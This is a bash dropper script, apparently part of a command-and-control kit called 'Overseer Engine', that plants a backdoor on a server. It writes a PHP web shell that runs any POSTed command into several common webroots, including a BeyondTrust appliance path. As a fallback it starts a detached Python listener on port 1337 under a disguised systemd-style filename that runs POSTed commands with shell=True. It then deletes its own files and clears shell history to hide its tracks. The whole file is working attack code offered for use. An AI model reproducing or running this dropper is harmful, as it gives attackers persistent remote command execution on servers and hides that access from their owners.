#!/bin/bash
# shell.sh - Overseer Engine Dropper Payload
# Retrieves and establishes persistent access for the Fleet Commander C2.

# --- 1. Webroot Backdoor Drop ---
# Attempt to drop a lightweight PHP shell into common web directories.
# The C2 sends `cmd` via x-www-form-urlencoded, so a basic $_POST handles it beautifully.
WEBROOTS=(
    "/var/www/html"
    "/opt/beyondtrust/web/public"
    "/usr/local/nginx/html"
    "/var/www"
    "/opt/apache/htdocs"
)

PAYLOAD='<?php if(isset($_POST["cmd"])){ echo shell_exec($_POST["cmd"]); } ?>'

for root in "${WEBROOTS[@]}"; do
    if [ -d "$root" ]; then
        # Create the API path if it doesn't exist
        mkdir -p "$root/api/v1" 2>/dev/null
        
        # Drop the payload. The C2 looks for /api/v1/backdoor
        echo "$PAYLOAD" > "$root/api/v1/backdoor.php"
        
        # Sometimes appliances route extensionless files natively via FastCGI mapping
        echo "$PAYLOAD" > "$root/api/v1/backdoor" 
    fi
done

# --- 2. Fallback: Python Standalone Listener ---
# If the webroot is read-only or we can't find it, we drop a pure Python standalone HTTP server
# that parses the urlencoded POST data and executes the command.
cat << 'EOF' > /tmp/.systemd_c2_update.py
import http.server
import socketserver
import subprocess
import urllib.parse
import sys

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(length).decode('utf-8')
            parsed = urllib.parse.parse_qs(post_data)
            
            if 'cmd' in parsed:
                cmd = parsed['cmd'][0]
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(output)
            else:
                self.send_response(400)
                self.end_headers()
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

    # Suppress noisy logging to stdout
    def log_message(self, format, *args):
        pass

# Bind to 1337 if the main 443/8443 routes fail
PORT = 1337
try:
    with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
        httpd.serve_forever()
except:
    sys.exit(0)
EOF

# Spawn the python listener silently and detach
nohup python3 /tmp/.systemd_c2_update.py >/dev/null 2>&1 &
nohup python /tmp/.systemd_c2_update.py >/dev/null 2>&1 &

# --- 3. Clean up ---
# Remove the dropper script itself and clear history so we don't leave tracks
rm -f /tmp/shell.sh
rm -f /tmp/.systemd_c2_update.py
history -c
